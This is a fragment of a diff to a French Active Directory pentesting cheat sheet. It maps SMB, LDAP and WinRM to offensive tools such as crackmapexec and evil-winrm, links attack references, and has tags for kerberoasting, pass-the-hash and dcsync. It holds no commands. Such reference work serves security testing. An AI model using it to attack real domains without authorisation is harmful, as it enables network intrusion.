+| SMB | `smbclient`, `crackmapexec`, `enum4linux`, `smbmap` |
+| LDAP | `ldapsearch`, `ldapdomaindump`, `BloodHound` |
+| WinRM | `evil-winrm`, `crackmapexec winrm` |
 
 ---
 
 ## 📚 Ressources
 
 - **HackTricks AD** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
-- **PayloadsAllTheThings AD** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
 - **The Hacker Recipes** : https://www.thehacker.recipes/ad/
+- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
 - **ired.team** : https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
-- **Impacket** : https://github.com/fortra/impacket
-- **BloodHound** : https://github.com/BloodHoundAD/BloodHound
 
 ---
 
-**Tags:** `#activedirectory #ad #kerberos #kerberoasting #pth #dcsync #bloodhound #mimikatz #impacket`
+**Tags:** `#activedirectory #enumeration #kerberos #ldap #smb #dns #winrm #adcs`
